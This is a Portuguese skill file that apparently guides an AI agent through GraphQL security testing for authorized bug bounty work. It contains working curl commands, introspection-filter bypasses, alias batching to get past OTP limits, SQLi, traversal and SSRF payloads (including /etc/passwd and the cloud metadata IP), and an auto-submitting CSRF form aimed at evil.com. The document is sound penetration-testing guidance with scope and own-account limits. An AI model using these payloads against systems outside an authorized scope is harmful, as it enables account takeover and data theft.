---
name: graphql-testing
description: Metodologia completa de teste de endpoints GraphQL para bug bounty e pentest autorizado. Use SEMPRE que o alvo tiver qualquer requisição GraphQL — /graphql, /v1/graphql, /api/gql, POST com corpo {"query": "..."}, respostas com {"data": ...} / {"errors": [...]}, ou headers/JS mencionando Apollo, Relay, Hasura, urql — e sempre que o usuário mencionar "graphql", "introspection", "graphiql", "playground", "batching", "aliases", "field suggestion", "clairvoyance", "InQL", "graphw00f". Cobre: descoberta de endpoints e consoles (graphiql, playground, altair, voyager), fingerprint do engine (Apollo, Hasura, Graphene, Yoga, Ariadne, graphql-php, Sangria) porque cada um tem falhas conhecidas, introspection e seus bypasses (GET em vez de POST, quebra de linha dentro de __schema, __type direto, content-type alternativo), reconstrução do schema QUANDO A INTROSPECTION ESTÁ DESLIGADA via field suggestions "Did you mean" e clairvoyance, falhas de AUTORIZAÇÃO que são o que mais rende (IDOR por node(id:) e por IDs base64 tipo VXNlcjox = User:1, authz ausente em mutations, authz por campo), BATCHING por array e por ALIASES para burlar rate limit, brute force de senha e bypass de OTP/2FA em uma única requisição, injeção SQL/NoSQL e SSRF através de argumentos, CSRF COMO PRIORIDADE — dois vetores testados em TODAS as mutations: (1) converter a requisição POST em GET com query, operationName e variables na URL, habilitando CSRF por link; (2) trocar o Content-Type de application/json para application/x-www-form-urlencoded ou text/plain, que são simple requests e não disparam preflight CORS — se o backend for permissivo e fizer o parse do corpo assim, um formulário HTML oculto executa a mutation com os cookies da vítima sem token CSRF; SEMPRE confirmar que o servidor PROCESSA e não apenas aceita, verificando que o ESTADO mudou por outro canal, nunca concluindo por 200 OK; mais o padrão de LAVAGEM DE TOKEN CSRF (caso Facebook SMS Captcha: /sms/captcha/?next=/path sem proteção, em que a própria aplicação emitia um POST com o token fb_dtsg válido para o destino escolhido pelo atacante, permitindo executar qualquer endpoint GraphQL sensível — procurar next=, redirect=, return_to=, continue=, dest=, url=); teste de TODOS os métodos HTTP (GET/POST/PUT/PATCH/HEAD/OPTIONS) no endpoint após obter o schema, já que cada método aceito que execute mutation é um canal de escrita fora do previsto; vazamento por mensagens de erro e stack traces, e a ligação com cache (query por GET pode ser cacheada pela CDN e vazar dado entre usuários — ver web-cache-auth-leak). NÃO cobre e NÃO deve executar ataques de negação de serviço (aninhamento profundo, queries circulares, sobrecarga de alias) — apenas detectar se há limite de profundidade com probe mínimo. Só usar dentro do escopo formalmente autorizado.
---

# Teste de Endpoints GraphQL

Metodologia para avaliar um endpoint GraphQL de um alvo **autorizado**.

**Pré-condição obrigatória**: só use dentro do escopo formalmente autorizado.
Use contas que você mesmo controla. Regra de ouro: **provar o acesso, nunca
abusar dele** — não extraia dados em massa, não altere dado de terceiro.

**Proibido nesta skill: negação de serviço.** Aninhamento profundo, queries
circulares e sobrecarga de aliases derrubam o serviço e prejudicam usuários
reais. A skill detecta *se existe limite de profundidade* com um probe mínimo
(seção 11) e para por aí.

## 1. Por que GraphQL rende tanto

Três características estruturais criam a superfície:

1. **Um único endpoint, muitas operações.** WAF e logging que pensam em
   URL/rota ficam cegos: tudo é `POST /graphql`. Regras de autorização
   baseadas em path não se aplicam.
2. **O cliente escolhe os campos.** Se a autorização é por *resolver* e não por
   *campo*, basta pedir o campo certo dentro de uma query permitida.
3. **Uma requisição pode conter N operações.** Aliases e batching transformam
   um rate limit "10 tentativas por minuto" em 10 mil por requisição.

## 2. Descoberta

### 2.1 Endpoints

```
/graphql            /graphql/            /api/graphql         /v1/graphql
/v2/graphql         /graphql/v1          /gql                 /api/gql
/query              /api/query           /graphql.php         /index.php?graphql
/admin/graphql      /shop/graphql        /subscriptions       /_graphql
```

```bash
for P in graphql api/graphql v1/graphql gql query api/gql graphql/v1; do
  C=$(curl -s -o /tmp/g.txt -w '%{http_code}' -X POST "https://alvo.com/$P" \
       -H 'Content-Type: application/json' -d '{"query":"{__typename}"}')
  echo "[$C] /$P  $(head -c 120 /tmp/g.txt | tr -d '\n')"
done
```

`{"data":{"__typename":"Query"}}` confirma. Um erro **de GraphQL** (mesmo que
seja erro) também confirma — `"errors":[{"message":"..."}]`.

### 2.2 Consoles expostos

```
/graphiql       /playground      /altair       /voyager
/graphql/console                 /graphql-playground
```

Console aberto em produção já é achado de configuração — e facilita todo o
resto.

### 2.3 Descoberta pelo JavaScript

Rode a skill `bughunter` sobre os bundles: nomes de operação, queries inteiras
e campos costumam estar hardcoded no front. Isso te dá **o schema real que a
aplicação usa**, mesmo com introspection desligada.

```bash
grep -ohE '(query|mutation|subscription)\s+[A-Za-z0-9_]+' bundles/*.js | sort -u
grep -ohE 'operationName["'\'':= ]+["'\''][A-Za-z0-9_]+' bundles/*.js | sort -u
```

## 3. Fingerprint do engine

Cada implementação tem comportamento e falhas próprias. Envie uma query
malformada e leia o formato do erro.

```bash
curl -s -X POST https://alvo.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ __typename @xandsz }"}' | head -c 400
```

| Pista na resposta | Engine |
|---|---|
| `"extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}` | Apollo Server |
| `x-hasura-*`, `"code":"validation-failed"` | Hasura |
| `"locations"` + erro em `snake_case` | Graphene (Python) |
| `Unknown directive` sem `extensions` | graphql-js puro / Yoga |
| `"debugMessage"` | graphql-php / Lighthouse (Laravel) |
| `Sangria` na mensagem | Sangria (Scala) |

A ferramenta `graphw00f` automatiza isso. Com o engine identificado, pesquise
CVEs e defaults inseguros daquela versão.

**Hasura merece atenção especial:** se o alvo é Hasura, teste imediatamente se
o role anônimo tem permissões amplas — é o erro de configuração mais comum ali.

## 4. Introspection

### 4.1 Teste mínimo

```bash
curl -s -X POST https://alvo.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{queryType{name}}}"}'
```

Se responder, a introspection está ligada. Puxe o schema completo:

```bash
curl -s -X POST https://alvo.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { name kind description fields(includeDeprecated:true) { name description args { name type { name kind ofType { name kind } } } type { name kind ofType { name kind } } } inputFields { name type { name kind } } } } }"}' \
  -o schema.json
```

Depois disso, priorize a leitura por: **mutations** primeiro (é onde estão as
ações), campos com nome sugestivo (`isAdmin`, `role`, `secret`, `token`,
`internal`, `password`, `email`, `phone`), e tipos que não aparecem na
interface.

### 4.2 Bypasses quando a introspection está bloqueada

Filtros costumam ser regex ingênua sobre a string `__schema`:

```bash
# 1) GET em vez de POST — muitos filtros só olham o POST
curl -s -G https://alvo.com/graphql --data-urlencode 'query={__schema{queryType{name}}}'

# 2) quebra de linha depois de __schema — quebra o regex "__schema{"
curl -s -X POST https://alvo.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__schema\n{queryType{name}}}"}'

# 3) __type direto, sem tocar em __schema
curl -s -X POST https://alvo.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{__type(name:\"User\"){name fields{name type{name}}}}"}'

# 4) content-type alternativo
curl -s -X POST https://alvo.com/graphql -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'query={__schema{queryType{name}}}'
```

### 4.3 Com o schema em mãos: testar os MÉTODOS HTTP

Introspection ligada é o ponto de partida, não o achado. Assim que tiver o
schema, descubra **quais métodos o endpoint aceita** — cada um que passar é um
canal a mais para ler, editar ou inserir dado, e um a menos de proteção.

```bash
Q='{"query":"{__typename}"}'
for M in GET POST PUT PATCH HEAD OPTIONS DELETE; do
  C=$(curl -s -o /tmp/m.txt -w '%{http_code}' -X "$M" https://alvo.com/graphql \
       -H 'Content-Type: application/json' -d "$Q")
  echo "[$C] $M  -> $(head -c 100 /tmp/m.txt | tr -d '\n')"
done
```

O que cada resultado significa:

| Método aceito | Consequência |
|---|---|
| **GET** | Query na URL → aparece em log, `Referer` e histórico; **cacheável** (seção 12); e habilita CSRF por link (seção 9.1) |
| **PUT / PATCH** | Costumam escapar de filtros de WAF e de regras que só olham POST |
| **HEAD** | Não devolve corpo, mas **executa** — útil para confirmar efeito colateral sem barulho |
| **OPTIONS** | Revela a política de CORS; combine com a seção 9 |

**O ponto que importa:** se um método alternativo executa **mutation**, você tem
escrita por um canal não previsto. Teste sempre uma mutation inofensiva sua
(ex.: renomear algo seu) por cada método que passou — e confirme o efeito no
estado, não só o status 200.

## 5. Reconstruir o schema SEM introspection

Esta é a parte que separa quem desiste de quem acha bug.

### 5.1 Field suggestions — "Did you mean"

O graphql-js e derivados sugerem o nome correto quando você erra um campo. Isso
vaza o schema campo a campo:

```bash
curl -s -X POST https://alvo.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ usr { id } }"}'
# -> "Cannot query field \"usr\" on type \"Query\". Did you mean \"user\" or \"users\"?"
```

Cada erro entrega nomes válidos. Iterando, você reconstrói o schema inteiro —
é o que a ferramenta **clairvoyance** automatiza.

```bash
for F in user users me account profile admin settings orders payments; do
  R=$(curl -s -X POST https://alvo.com/graphql -H 'Content-Type: application/json' \
        -d "{\"query\":\"{ ${F}x { id } }\"}")
  echo "$F -> $(echo "$R" | grep -oE 'Did you mean[^"]*')"
  sleep 1
done
```

### 5.2 Nomes de operação do front

O que a aplicação chama é sempre válido. Combine 2.3 com 5.1: os nomes do
bundle dão o ponto de partida, as sugestões expandem a partir dali.

## 6. Autorização — o que mais rende

**A maior parte dos bugs reais de GraphQL é autorização, não injeção.**

### 6.1 IDOR por ID direto e por `node()`

Muitos schemas expõem `node(id:)` (Relay Global Object Identification), que
busca **qualquer** objeto por ID:

```graphql
{ node(id: "VXNlcjox") { ... on User { id email phone } } }
```

IDs em base64 seguem o padrão `Tipo:número`:

```bash
echo -n 'User:1' | base64        # VXNlcjox
echo VXNlcjox | base64 -d        # User:1
```

Decodifique um ID seu, troque o número pelo de outra conta **sua**, e veja se
volta. Nunca use ID de usuário real.

### 6.2 Autorização por campo

O resolver da query pode checar permissão, mas os **campos filhos** não:

```graphql
{ me { id name } }                      # permitido
{ me { id name email phone ssn role } } # os campos extras têm checagem?
{ post(id:1) { title author { email } } }   # sai pelo relacionamento
```

Peça sempre os campos sensíveis dentro de uma query que você já pode fazer. O
caminho mais produtivo é **por relacionamento**: um objeto público que aponta
para um objeto privado.

### 6.3 Mutations sem autorização

Mutations são o alvo de maior impacto. Do schema, liste todas e teste as que
mudam estado de outro objeto:

```graphql
mutation { updateUser(id:"OUTRO_ID_SEU", input:{email:"x@y.com"}) { id } }
mutation { deletePost(id:"...") { ok } }
mutation { addUserToOrg(userId:"...", role:ADMIN) { ok } }
```

Teste **sem token** e **com token de usuário comum**. Muitas apps protegem a
interface e esquecem o resolver.

### 6.4 Mass assignment no input

Se o input aceita campos que a interface não expõe:

```graphql
mutation { updateProfile(input:{name:"x", role:"admin", isVerified:true}) { id role } }
```

## 7. Batching e aliases

Uma requisição, N operações — o vetor mais característico de GraphQL.

### 7.1 Aliases

```graphql
{
  a1: checkCoupon(code:"AAAA") { valid }
  a2: checkCoupon(code:"AAAB") { valid }
  a3: checkCoupon(code:"AAAC") { valid }
}
```

### 7.2 Batching por array

```bash
curl -s -X POST https://alvo.com/graphql -H 'Content-Type: application/json' \
  -d '[{"query":"{me{id}}"},{"query":"{me{email}}"}]'
```

Se responder um array de resultados, o batching está habilitado.

### 7.3 O impacto real

- **Bypass de rate limit** — o limite conta *requisições*, não *operações*.
- **Brute force de senha** — dezenas de tentativas de `login` numa requisição.
- **Bypass de OTP / 2FA** — o caso clássico: enviar todos os códigos possíveis
  em aliases dentro de uma única requisição, escapando do contador de
  tentativas.

**Como testar com responsabilidade:** demonstre com **10 a 20 aliases**, contra
a **sua própria conta**, e mostre que o contador de tentativas não subiu na
proporção. Isso prova o bug. Não rode o espaço completo de códigos — isso é
brute force real contra a infraestrutura, não PoC.

## 8. Injeção pelos argumentos

Todo argumento é entrada não confiável que chega a um banco, a um ORM ou a uma
chamada interna.

```graphql
{ user(id: "1' OR '1'='1") { id } }
{ search(filter: "{\"$ne\":null}") { id } }        # NoSQL
{ users(orderBy: "id; SELECT pg_sleep(5)") { id } }
{ file(path: "../../etc/passwd") { content } }      # traversal
{ fetchUrl(url: "http://169.254.169.254/latest/meta-data/") { body } }   # SSRF
```

O `fetchUrl`/`importFrom`/`webhook` é o que mais rende: qualquer argumento que
aceite URL é candidato a SSRF — nesse caso, siga a metodologia da skill
`ssrf-pdf-generator` para os endpoints de metadata de cloud.

Erros de sintaxe SQL na resposta confirmam injeção sem precisar extrair nada.

## 9. CSRF — o vetor mais subestimado em GraphQL

**Teste isto em toda requisição GraphQL que altere estado.** É comum e o
impacto é direto: troca de e-mail, adição de número de telefone, remoção de
2FA — tudo sem interação além de um clique.

### 9.1 Vetor 1 — Converter POST em GET

Pegue uma requisição real da aplicação que faz `POST /graphql` com corpo JSON e
**converta tudo para GET**, com os mesmos parâmetros na query string:

```bash
# original
POST /graphql   Content-Type: application/json
{"query":"mutation { changeEmail(email:\"novo@dominio.com\") { success } }"}

# convertido
curl -s -G https://alvo.com/graphql -b "session=<sua-sessao>" \
  --data-urlencode 'query=mutation { changeEmail(email:"novo@dominio.com") { success } }'
```

Converta **todos** os parâmetros, não só o `query` — `operationName` e
`variables` também:

```bash
curl -s -G https://alvo.com/graphql -b "session=<sua-sessao>" \
  --data-urlencode 'query=mutation ChangeEmail($e:String!){ changeEmail(email:$e){ success } }' \
  --data-urlencode 'operationName=ChangeEmail' \
  --data-urlencode 'variables={"e":"novo@dominio.com"}'
```

**Se a aplicação aceitar E processar via GET, você tem CSRF por link** — basta
uma `<img src>` ou um clique.

**Só vale em ações com impacto real.** Uma query de leitura convertida para GET
não é CSRF; é só uma query. Foque em: mudança de e-mail/telefone, senha,
remoção de 2FA, transferência, alteração de permissão, exclusão.

### 9.2 Vetor 2 — Trocar o Content-Type para `x-www-form-urlencoded`

**Este é o mais comum, e o mais confundido com "protegido".**

APIs GraphQL normalmente esperam `Content-Type: application/json`. Como o
navegador **não** consegue enviar `application/json` a partir de um formulário
HTML simples sem disparar o preflight CORS (`OPTIONS`), muita gente conclui que
a aplicação está protegida contra CSRF.

**Mas se o backend for permissivo e processar o corpo mesmo com o content-type
trocado para `application/x-www-form-urlencoded`, a proteção some** — porque
esse content-type é *simple request* e não dispara preflight.

**Requisição original (JSON):**

```http
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=xyz

{"query": "mutation { changeEmail(email: \"hacker@evil.com\") { success } }"}
```

**Teste manual primeiro** — antes de montar HTML, confirme no curl:

```bash
curl -s -X POST https://alvo.com/graphql \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -b "session=<sua-sessao>" \
  --data-urlencode 'query=mutation { changeEmail(email: "novo@dominio.com") { success } }'
```

**PoC em formulário HTML** (o que o atacante hospeda):

```html
<form action="https://target.com/graphql" method="POST">
  <input type="hidden" name="query"
         value="mutation { changeEmail(email: &quot;hacker@evil.com&quot;) { success } }" />
</form>
<script>
  document.forms[0].submit();
</script>
```

**O que o navegador envia** — requisição simples, sem preflight, com os cookies
de sessão da vítima:

```http
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=xyz   (da vítima)

query=mutation+%7B+changeEmail%28email%3A+%22hacker%40evil.com%22%29+%7B+success+%7D+%7D
```

**A falha no servidor:** ele faz o parse dos parâmetros do formulário
(`query=...`), executa a mutation e altera o e-mail da vítima — sem preflight e
sem token CSRF.

Teste também `text/plain`, que também é *simple request*:

```bash
curl -s -X POST https://alvo.com/graphql \
  -H 'Content-Type: text/plain' -b "session=<sua-sessao>" \
  -d '{"query":"mutation { changeEmail(email: \"novo@dominio.com\") { success } }"}'
```

### 9.3 Garantir que ele PROCESSA, não apenas aceita

**Um `200 OK` não prova nada.** O servidor pode aceitar a requisição e ignorar
o corpo, devolvendo `{"data":null}` ou um erro de query vazia. Confirme sempre
pelo **efeito**:

1. **A resposta tem `data` preenchido** com o resultado da mutation, e não
   `errors` do tipo "Must provide query string"?
2. **O estado mudou de verdade?** Recarregue o perfil por outro canal (interface
   ou uma query normal) e confirme que o e-mail/telefone/permissão mudou.
3. **Repita** — o efeito tem que ser reprodutível.

```bash
# depois do teste, confirme o estado por uma query normal
curl -s -X POST https://alvo.com/graphql -H 'Content-Type: application/json' \
  -b "session=<sua-sessao>" -d '{"query":"{ me { email phone } }"}'
```

Só considere confirmado quando o estado mudou. Use sempre **sua própria conta**
como vítima.

### 9.4 Testar em VÁRIAS requisições, não em uma

O comportamento pode variar por operação — a aplicação pode ter middleware de
CSRF em algumas rotas e não em outras, ou o parser de form estar ativo só em
parte do fluxo.

Levante todas as mutations que a aplicação realmente dispara (via
`bughunter` nos bundles, seção 2.3, e pelo tráfego capturado) e rode os dois
vetores em **cada uma** delas:

```bash
while read -r OP; do
  echo "=== $OP"
  # vetor 1: GET
  curl -s -G https://alvo.com/graphql -b "$C" --data-urlencode "query=$OP" | head -c 200; echo
  # vetor 2: form-urlencoded
  curl -s -X POST https://alvo.com/graphql -H 'Content-Type: application/x-www-form-urlencoded' \
    -b "$C" --data-urlencode "query=$OP" | head -c 200; echo
  sleep 1
done < mutations.txt
```

### 9.5 Caso real — Facebook SMS Captcha: lavagem de token CSRF

Reportado por Lokesh Kumar à Meta (Facebook), publicado em 17/10/2022.
Encontrado enquanto o pesquisador procurava um bypass no fluxo de recuperação
de conta, depois de reportar um bug de deanonimização — ao pedir múltiplos
códigos OTP, caiu no fluxo de SMS captcha.

**Endpoint vulnerável:**

```
https://m.facebook.com/sms/captcha/?next=/path
```

**A falha:** o parâmetro `next=` não tinha nenhuma proteção contra CSRF, e a
URL de ação era enviada como **requisição POST já acompanhada do token CSRF
válido `fb_dtsg`**.

Ou seja: a própria aplicação **emprestava um token CSRF válido** para um
destino escolhido pelo atacante. O atacante não precisava roubar o token — só
apontar o `next=` para o endpoint que queria executar.

**Impacto:** o atacante podia anexar qualquer endpoint GraphQL sensível:

- criar, atualizar ou apagar feeds e stories
- adicionar ou remover endereço de e-mail e número de telefone
- alterar qualquer configuração sensível em `/settings`

Se a vítima clicasse no botão **Continue**, o POST era enviado com o token CSRF
válido e a ação era executada com sucesso.

**O padrão a procurar em qualquer alvo** — chame de *lavagem de token CSRF*:
qualquer endpoint que receba um destino por parâmetro (`next=`, `redirect=`,
`return_to=`, `continue=`, `dest=`, `url=`) **e** dispare um POST com token
CSRF válido para esse destino. A proteção anti-CSRF existe, mas a aplicação a
entrega de bandeja para o alvo que o atacante escolher.

Como caçar:

```
1. Liste parâmetros de destino: next, redirect, return_to, continue, dest, url, r
2. Para cada um, veja se a página resultante monta um FORM com token CSRF
   cujo action aponta para o valor do parâmetro
3. Aponte o parâmetro para uma rota sensível (uma sua, de teste)
4. Confirme que o POST sai com o token válido e que a ação executa
```

Isso vale além de GraphQL, mas em GraphQL é especialmente grave: **um único
endpoint** (`/graphql`) executa qualquer operação, então basta apontar o `next=`
para ele uma vez.

## 10. Vazamento por erro

```bash
curl -s -X POST https://alvo.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ user(id: null) { id } }"}' | python3 -m json.tool | head -40
```

Procure em `errors[].extensions`: `stacktrace`, `debugMessage`, caminho físico,
nome de classe, query SQL, versão do framework. Modo debug ligado em produção é
achado por si só e alimenta todo o resto do teste.

## 11. Profundidade — detectar, NÃO explorar

Um probe **mínimo** só para registrar se existe limite:

```graphql
{ user { posts { author { posts { author { id } } } } } }
```

Se responder normalmente, não há limite de profundidade — **registre como
observação de configuração e pare aqui**. Não escale a profundidade, não crie
query circular, não sobrecarregue aliases: isso é negação de serviço contra o
alvo, fora do escopo desta skill e da maioria dos programas.

## 12. GraphQL e cache

Se o alvo aceita query por **GET** (`/graphql?query={me{email}}`), a resposta
pode ser cacheada por CDN — e servida ao usuário errado.

```bash
curl -sI -G "https://alvo.com/graphql?cb=$RANDOM$RANDOM" \
  --data-urlencode 'query={__typename}' | grep -iE 'age|x-cache|cf-cache|cache-control|vary'
```

Se vier `HIT` ou `Age > 0` numa resposta que depende da sessão, siga a
metodologia completa da skill **`web-cache-auth-leak`** — inclusive a técnica
4.4 (wildcard cache rule + traversal), já que `/graphql` é justamente um dos
endpoints sensíveis que ela lista como alvo.

## 13. Ferramentas

| Ferramenta | Para quê |
|---|---|
| `graphw00f` | Fingerprint do engine |
| `clairvoyance` | Reconstruir schema sem introspection (field suggestions) |
| `InQL` | Extensão do Burp: schema, geração de queries, scan |
| `graphql-cop` | Checagens rápidas de configuração |
| `batchql` | Testes de batching e aliases |
| `graphql-voyager` | Visualizar o schema recuperado |

Ferramenta acelera, mas o achado vem da leitura do schema — priorize entender
mutations e relacionamentos.

## 14. Ordem de execução

```
1. Descobrir endpoint + consoles                  (seção 2)
2. Fingerprint do engine                          (seção 3)
3. Introspection ligada?  -> baixa o schema       (seção 4)
   |__ bloqueada?  -> bypasses, depois field suggestions  (4.2, 5)
   |__ ligada?     -> testa TODOS os métodos HTTP: GET/POST/PUT/PATCH/HEAD (4.3)
                      cada método que passa e executa mutation = canal de escrita
4. Ler o schema: mutations primeiro, campos sensíveis, relacionamentos
5. AUTORIZAÇÃO  <- gaste a maior parte do tempo aqui   (seção 6)
6. Batching / aliases contra rate limit e OTP     (seção 7)
7. Injeção e SSRF pelos argumentos                (seção 8)
8. CSRF — os dois vetores, em TODAS as mutations   (seção 9)
   |__ 9.1 converter POST -> GET
   |__ 9.2 trocar content-type para x-www-form-urlencoded
   |__ 9.3 CONFIRMAR que processa (estado mudou), nao so 200 OK
   |__ 9.5 procurar lavagem de token CSRF (next=/redirect=)
9. Erros e debug                                  (seção 10)
10. Cache no /graphql                             (seção 12)
```

O passo 5 é onde está a maioria dos achados pagos. Introspection desligada é
configuração, não vulnerabilidade — não pare aí nem reporte só isso.

## 15. Reportar

1. Requisição completa (endpoint, headers, corpo) e resposta, ambas cruas.
2. Para autorização: mostre a resposta **com** o token da conta A pedindo dado
   da conta B, e a prova de que A não deveria ver aquilo.
3. Para batching: mostre o contador de tentativas antes e depois — é isso que
   prova o bypass de rate limit.
4. Redija dados pessoais e tokens (`[REDACTED]`), inclusive das suas contas.
5. Diga explicitamente que usou contas próprias e não tocou em dado de
   terceiros.
6. Remediação: autorização no nível de campo e de resolver, desligar
   introspection e sugestões de campo em produção, desabilitar batching ou
   limitar operações por requisição, aplicar rate limit por operação (não por
   requisição), e desligar o modo debug.

## 16. Checklist

- [ ] Endpoint confirmado com `{__typename}`.
- [ ] Consoles testados (`/graphiql`, `/playground`, `/altair`, `/voyager`).
- [ ] JS da aplicação varrido por operações e campos (`bughunter`).
- [ ] Engine identificado; CVEs e defaults daquele engine pesquisados.
- [ ] Introspection testada; se bloqueada, os 4 bypasses testados.
- [ ] Introspection off? Field suggestions usadas para reconstruir o schema.
- [ ] Schema lido com foco em mutations, campos sensíveis e relacionamentos.
- [ ] IDOR testado por ID direto e por `node(id:)`, com IDs base64 decodificados.
- [ ] Autorização por campo testada dentro de query permitida.
- [ ] Mutations testadas sem token e com token de usuário comum.
- [ ] Mass assignment testado nos inputs.
- [ ] Batching por array e por aliases testados — 10 a 20 aliases, conta própria.
- [ ] Rate limit e OTP verificados contra o contador de tentativas.
- [ ] Argumentos testados para SQLi, NoSQLi, traversal e SSRF.
- [ ] Métodos HTTP testados: GET, POST, PUT, PATCH, HEAD, OPTIONS (4.3).
- [ ] Cada método aceito testado com mutation, confirmando efeito no estado.
- [ ] CSRF vetor 1: POST convertido para GET, com query/operationName/variables.
- [ ] CSRF vetor 2: content-type trocado para `x-www-form-urlencoded` e `text/plain`.
- [ ] CSRF confirmado pelo ESTADO, não por 200 OK — recarregado por outro canal.
- [ ] Os dois vetores rodados em TODAS as mutations, não em uma só (9.4).
- [ ] Procurado parâmetro de destino (`next=`, `redirect=`, `return_to=`) que
      dispare POST com token CSRF válido — lavagem de token (9.5).
- [ ] CSRF testado só em ações com impacto real (e-mail, telefone, 2FA, permissão).
- [ ] Erros inspecionados por stack trace e modo debug.
- [ ] Cache do `/graphql` verificado (seção 12).
- [ ] NENHUM teste de negação de serviço executado.
- [ ] Apenas contas próprias usadas; nenhum dado de terceiro acessado.
